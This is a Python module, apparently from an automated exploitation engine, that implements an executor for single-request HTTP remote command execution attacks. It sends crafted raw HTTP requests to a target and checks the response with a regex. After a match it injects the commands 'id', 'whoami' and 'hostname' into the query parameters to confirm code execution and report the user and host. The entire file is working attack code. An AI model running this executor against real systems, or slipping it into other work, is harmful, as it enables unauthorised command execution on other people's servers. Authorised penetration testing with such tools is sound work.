import logging
import re
import socket
import ssl
from typing import Any, Dict

logger = logging.getLogger("kali-engine.executor.http_rce_single_request")


class HttpRceSingleRequestExecutor:
    """
    Executor for single-request HTTP RCE exploits.
    Example: ?cmd=id, CGI RCE, simple PHP eval
    """

    def __init__(
        self,
        host: str,
        scheme: str,
        port: int,
        method: str,
        path: str,
        query: Dict[str, str],
        success_regex: str,
        timeout: float = 5.0,
    ):
        self.host = host
        self.scheme = scheme
        self.port = port
        self.method = method
        self.path = path
        self.query = query
        self.success_regex = success_regex
        self.timeout = timeout

    def execute(self) -> Dict[str, Any]:
        try:
            logger.info(
                "[EXECUTOR] http_rce_single_request: %s %s://%s:%d%s",
                self.method,
                self.scheme,
                self.host,
                self.port,
                self.path,
            )

            full_path = self._build_path()
            http_request = self._build_http_request(full_path)

            response = self._send_request(http_request)

            if re.search(self.success_regex, response):
                return self._success(response)

            return self._fail(
                "TARGET_FAILURE",
                "HTTP response did not match success condition",
            )

        except Exception as e:
            logger.exception("[EXECUTOR] http_rce_single_request failed")
            return self._fail("EXECUTOR_ERROR", str(e))

    def _build_path(self) -> str:
        if not self.query:
            return self.path

        query_string = "&".join(f"{k}={v}" for k, v in self.query.items())
        return f"{self.path}?{query_string}"

    def _build_http_request(self, path: str) -> bytes:
        req = f"{self.method} {path} HTTP/1.1\r\n"
        req += f"Host: {self.host}\r\n"
        req += "Connection: close\r\n"
        req += "\r\n"
        return req.encode("utf-8")

    def _send_request(self, data: bytes) -> str:
        sock = socket.create_connection((self.host, self.port), timeout=self.timeout)

        if self.scheme == "https":
            context = ssl.create_default_context()
            sock = context.wrap_socket(sock, server_hostname=self.host)

        sock.sendall(data)

        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk

        sock.close()
        return response.decode(errors="ignore")

    def _success(self, response: str) -> Dict[str, Any]:
        probe = self._probe_http_commands()

        details = (
            "HTTP command execution confirmed. "
            f"User: {probe.get('whoami', '?')}, "
            f"Host: {probe.get('hostname', '?')}"
        )

        return {
            "status": "SUCCESS",
            "details": details,
            "artifact": {
                "matched_regex": self.success_regex,
                "initial_response_snippet": response[:500],
                "probe": probe,
            },
        }

    def _fail(self, status: str, reason: str) -> Dict[str, Any]:
        return {
            "status": status,
            "details": reason,
        }

    def _probe_http_commands(self) -> Dict[str, str]:
        """
        Execute basic verification commands via HTTP RCE.
        """
        probes = ["id", "whoami", "hostname"]
        results = {}

        for cmd in probes:
            try:
                query = dict(self.query)
                # Convención: el parámetro ya contiene el comando (ej: cmd)
                for k in query:
                    query[k] = cmd

                path = self._build_path_with_query(query)
                http_request = self._build_http_request(path)
                response = self._send_request(http_request)

                results[cmd] = response[:1000].strip()
            except Exception as e:
                results[cmd] = f"<error: {e}>"

        return results

    def _build_path_with_query(self, query: Dict[str, str]) -> str:
        query_string = "&".join(f"{k}={v}" for k, v in query.items())
        return f"{self.path}?{query_string}"
